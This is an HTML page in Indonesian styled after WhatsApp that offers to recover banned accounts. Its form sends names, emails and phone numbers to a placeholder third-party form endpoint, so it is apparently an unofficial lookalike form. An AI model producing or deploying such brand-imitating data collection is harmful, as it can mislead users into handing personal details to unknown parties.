<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Unbanned WhatsApp</title>

    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #25D366, #128C7E);
            height: 100vh;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .container {
            background: white;
            padding: 30px;
            width: 350px;
            border-radius: 10px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
        }

        h1 {
            text-align: center;
            color: #128C7E;
        }

        .subtitle {
            text-align: center;
            font-size: 14px;
            color: #555;
            margin-bottom: 20px;
        }

        label {
            font-size: 14px;
            margin-top: 10px;
            display: block;
        }

        input, textarea {
            width: 100%;
            padding: 8px;
            margin-top: 5px;
            border-radius: 5px;
            border: 1px solid #ccc;
        }

        button {
            width: 100%;
            padding: 10px;
            margin-top: 20px;
            border: none;
            background: #25D366;
            color: white;
            font-size: 16px;
            border-radius: 5px;
            cursor: pointer;
        }

        button:hover {
            background: #1ebe5d;
        }

        .footer {
            text-align: center;
            font-size: 12px;
            margin-top: 15px;
            color: #999;
        }
    </style>
</head>

<body>

<div class="container">
    <h1>Unbanned WhatsApp</h1>
    <p class="subtitle">
        Ajukan pemulihan akun WhatsApp Anda yang terblokir.
    </p>

    <!-- GANTI LINK FORMSPREE -->
    <form action="https://formspree.io/f/XXXXXXXX" method="POST">

        <label>Nama Lengkap</label>
        <input type="text" name="nama" required>

        <label>Email Aktif</label>
        <input type="email" name="email" required>

        <label>Nomor WhatsApp</label>
        <input type="text" name="whatsapp" placeholder="+628xxxx" required>

        <label>Alasan Pemulihan</label>
        <textarea name="alasan" rows="4" required></textarea>

        <button type="submit">Kirim Pengajuan</button>
    </form>

    <p class="footer">
        Â© 2026 Unbanned WhatsApp Service
    </p>
</div>

</body>
</html>
